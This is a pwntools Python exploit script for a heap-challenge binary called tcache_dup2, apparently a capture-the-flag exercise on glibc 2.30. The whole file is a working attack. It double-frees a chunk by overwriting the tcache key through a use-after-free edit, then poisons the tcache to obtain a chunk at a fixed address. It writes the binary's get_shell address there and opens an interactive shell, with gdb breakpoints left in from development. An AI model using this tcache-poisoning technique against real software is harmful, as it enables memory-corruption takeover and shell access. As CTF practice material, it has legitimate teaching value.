#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_dup2_patched")
libc = ELF("./libc-2.30.so")
ld = ELF("./ld-2.30.so")

context.binary = exe
p = process()
gdb.attach(p,gdbscript='''
           b*create_heap+82
           b*create_heap+94
           b*create_heap+222
           b*delete_heap+63
           b*delete_heap+152
           ''')
def create_heap(size,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'Size: ',str(size))
    p.sendafter(b'Data: ',data)
def delete_heap(idx):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'idx: ',str(idx))
def modify_heap(idx,size,data):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'idx: ',str(idx))
    p.sendlineafter(b'Size: ',str(size))
    p.sendafter(b'Data: ',data)
input()
create_heap(50,b'aaaa')
delete_heap(0)

modify_heap(0,9,b'a'*9)
delete_heap(0)

#modify_heap(0,9,b'a'*9)
#delete_heap(0)


create_heap(50,p64(0x404058))
create_heap(50,b'a')
create_heap(50,p64(exe.sym.get_shell))

p.interactive()
